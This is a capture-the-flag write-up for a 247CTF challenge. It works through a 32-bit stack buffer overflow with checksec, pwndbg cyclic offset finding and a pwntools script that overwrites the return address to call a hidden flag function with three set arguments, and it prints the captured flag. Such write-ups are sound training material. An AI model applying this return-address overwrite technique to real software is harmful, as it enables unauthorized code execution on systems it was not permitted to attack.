# HIDDEN FLAG FUNCTION PARAMETERS

Can you control this applications flow to gain access to the hidden flag function with the correct parameters?

basic file check :

```bash
❯ checksec --file=hidden_flag_function_with_args
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73 Symbols	 No	0		2		hidden_flag_function_with_args
```

let's run the binary:

```bash
❯ ./hidden_flag_function_with_args
Sorry, no flag here!
You can ask for one though:
give me flag
```

open the binary in ghidra:

Main functions:

---
<img width="1386" alt="main" src="https://github.com/Lynk4/247ctf/assets/44930131/80895ab8-4ae2-4b2e-9453-439c99ba7a6a">

---


Chall Function:

---

<img width="1391" alt="chall" src="https://github.com/Lynk4/247ctf/assets/44930131/b09f3133-d3a3-412c-804e-90ae749206ac">

---

Flag Function:

---

<img width="1391" alt="flag" src="https://github.com/Lynk4/247ctf/assets/44930131/78d4b4fb-7c12-43ff-a93e-904de2ce668d">

---

As we can see the flag functions checks three arguments so our payload will look like this:

offset + flag_function_address + offset_between_funciton_and_arguments + arg1 + arg2 + arg3


---


Find the offset:
---


```bash
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg> run
Starting program: /home/lynk/247/hidden-flag-parameters/hidden_flag_function_with_args 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Sorry, no flag here!
You can ask for one though:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
0x6261616b in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────
*EAX  0x1
*EBX  0x62616169 ('iaab')
 ECX  0x0
*EDX  0xf7fc34c0 ◂— 0xf7fc34c0
*EDI  0xf7ffcba0 (_rtld_global_ro) ◂— 0x0
*ESI  0x8048690 (__libc_csu_init) ◂— push ebp
*EBP  0x6261616a ('jaab')
*ESP  0xffffd430 ◂— 'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
*EIP  0x6261616b ('kaab')
──────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────────────────────
Invalid address 0x6261616b










───────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd430 ◂— 'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
01:0004│     0xffffd434 ◂— 'maabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
02:0008│     0xffffd438 ◂— 'naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
03:000c│     0xffffd43c ◂— 'oaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
04:0010│     0xffffd440 ◂— 'paabqaabraabsaabtaabuaabvaabwaabxaabyaab'
05:0014│     0xffffd444 ◂— 'qaabraabsaabtaabuaabvaabwaabxaabyaab'
06:0018│     0xffffd448 ◂— 'raabsaabtaabuaabvaabwaabxaabyaab'
07:001c│     0xffffd44c ◂— 'saabtaabuaabvaabwaabxaabyaab'
─────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────
 ► 0 0x6261616b
   1 0x6261616c
   2 0x6261616d
   3 0x6261616e
   4 0x6261616f
   5 0x62616170
   6 0x62616171
   7 0x62616172
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l kaab
Finding cyclic pattern of 4 bytes: b'kaab' (hex: 0x6b616162)
Found at offset 140
pwndbg> cyclic 50
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
pwndbg> r <<< $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAv\x85\x04\x08aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama") 
Starting program: /home/lynk/247/hidden-flag-parameters/hidden_flag_function_with_args <<< $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAv\x85\x04\x08aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Sorry, no flag here!
You can ask for one though:

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────
*EAX  0x1
*EBX  0x41414141 ('AAAA')
 ECX  0x0
*EDX  0xf7fc34c0 ◂— 0xf7fc34c0
*EDI  0xf7ffcba0 (_rtld_global_ro) ◂— 0x0
*ESI  0x8048690 (__libc_csu_init) ◂— push ebp
*EBP  0x41414141 ('AAAA')
*ESP  0xffffd434 ◂— 'baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama'
*EIP  0x61616161 ('aaaa')
────────────────────[ DISASM / i386 / set emulate on ]─────────────────────
Invalid address 0x61616161










─────────────────────────────────[ STACK ]─────────────────────────────────
00:0000│ esp 0xffffd434 ◂— 'baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama'
01:0004│     0xffffd438 ◂— 'caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama'
02:0008│     0xffffd43c ◂— 'daaaeaaafaaagaaahaaaiaaajaaakaaalaaama'
03:000c│     0xffffd440 ◂— 'eaaafaaagaaahaaaiaaajaaakaaalaaama'
04:0010│     0xffffd444 ◂— 'faaagaaahaaaiaaajaaakaaalaaama'
05:0014│     0xffffd448 ◂— 'gaaahaaaiaaajaaakaaalaaama'
06:0018│     0xffffd44c ◂— 'haaaiaaajaaakaaalaaama'
07:001c│     0xffffd450 ◂— 'iaaajaaakaaalaaama'
───────────────────────────────[ BACKTRACE ]───────────────────────────────
 ► 0 0x61616161
   1 0x61616162
   2 0x61616163
   3 0x61616164
   4 0x61616165
   5 0x61616166
   6 0x61616167
   7 0x61616168
───────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l aaaa
Finding cyclic pattern of 4 bytes: b'aaaa' (hex: 0x61616161)
Found at offset 0
pwndbg> cyclic -l baaa
Finding cyclic pattern of 4 bytes: b'baaa' (hex: 0x62616161)
Found at offset 4
pwndbg>
```


Now let's craft the exploit:

---

```python3
from pwn import *

context.binary = binary = "./hidden_flag_function_with_args"

payload = b'A' * 140 + p32(0x08048576) + b'B' * 4 + p32(0x1337) + p32(0x247) + p32(0x12345678)

p = process()
p = remote("6a058a6105c92190.247ctf.com",50416)
p.recv()
p.sendline(payload)
p.interactive()
```

---

runing the exploit:

---

```bash
❯ python3 exploit.py
[*] '/home/lynk/247/hidden-flag-parameters/hidden_flag_function_with_args'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
[+] Starting local process '/home/lynk/247/hidden-flag-parameters/hidden_flag_function_with_args': pid 19607
[+] Opening connection to 6a058a6105c92190.247ctf.com on port 50416: Done
[*] Switching to interactive mode
[*] '/home/lynk/247/hidden-flag-parameters/hidden_flag_function_with_args'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
[*] '/home/lynk/247/hidden-flag-parameters/hidden_flag_function_with_args'
[*] '/home/lynk/247/hidden-flag-parameters/hidden_flag_function_with_args'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/lynk/247/hidden-flag-parameters/hidden_flag_function_with_args': pid 19607
[+] Opening connection to 6a058a6105c92190.247ctf.com on port 50416: Done
[*] Switching to interactive mode
How did you get here?
Have a flag!
247CTF{da70c8d41fc43fc59cf04f4e591c9ad6}

[*] Got EOF while reading in interactive
$  
```
---

